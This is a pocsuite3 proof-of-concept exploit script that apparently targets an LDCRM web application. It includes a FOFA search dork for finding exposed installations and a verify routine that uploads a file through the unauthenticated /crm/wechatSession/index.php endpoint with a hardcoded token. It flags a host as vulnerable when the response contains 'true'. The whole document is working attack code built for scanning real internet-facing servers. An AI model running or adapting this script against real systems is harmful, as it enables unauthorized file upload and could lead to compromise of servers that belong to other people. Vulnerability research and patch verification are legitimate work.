from pocsuite3.api import POCBase, register_poc, requests, Output
import os

proxies = {
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}


class POC(POCBase):
    dork = {
        "fofa": 'body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")'}

    def _verify(self):
        output = Output(self)
        result = {}
        url = f"{self.url}/crm/wechatSession/index.php"
        params = {
            'token': '9b06a9617174f1085ddcfb4ccdb6837f',
            'msgid': '1',
            'operation': 'upload'
        }
        files = {
            'file': ('2.txt', '1', 'image/jpeg')
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7',
            'Connection': 'keep-alive'
        }
        response = requests.post(url, params=params, files=files, headers=headers, proxies=proxies)
        if response.status_code == 200 and "true" in response.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = '2.txt'
            return self.parse_output(result)


register_poc(POC)
